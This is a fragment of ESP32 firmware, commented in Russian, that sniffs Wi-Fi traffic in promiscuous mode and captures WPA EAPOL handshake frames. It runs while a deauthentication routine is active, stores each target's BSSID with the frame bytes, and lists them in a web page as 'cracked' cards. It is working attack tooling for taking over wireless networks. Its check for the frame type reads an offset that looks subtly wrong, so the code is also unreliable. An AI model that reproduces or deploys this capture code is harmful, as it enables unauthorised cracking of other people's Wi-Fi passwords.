TaskHandle_t hsHandle=NULL;
void hsTask(void*){
  // упрощённо: сохраняем EAPOL-фреймы в память
  wifi_promiscuous_filter_t filt={.filter_mask=WIFI_PROMIS_FILTER_MASK_DATA};
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type){
    if(type!=WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t* p=(wifi_promiscuous_pkt_t*)buf;
    uint8_t* f=p->payload;
    // EAPOL: type 0x88 0x8e в LLC
    if(f[24]==0x88 && f[25]==0x8e){
      String data="";
      for(int i=0;i<64;i++){char b[4];sprintf(b,"%02x",f[i]);data+=b;}
      char bssid[18];
      sprintf(bssid,"%02X:%02X:%02X:%02X:%02X:%02X",f[16],f[17],f[18],f[19],f[20],f[21]);
      handshakes.push_back({String(bssid),"",data});
      rlog("[hs] EAPOL от "+String(bssid));
    }
  });
  esp_wifi_set_promiscuous(true);
  while(deauthRunning) delay(500);
  esp_wifi_set_promiscuous(false);
  hsHandle=NULL; vTaskDelete(NULL);
}

String buildHsHtml(){
  String h="";
  for(auto &x:handshakes) h+="<div class='card cracked'><b>"+x.bssid+"</b><br><small>"+x.data.substring(0,120)+"...</small></div>";
  return h==""?"—":h;
}

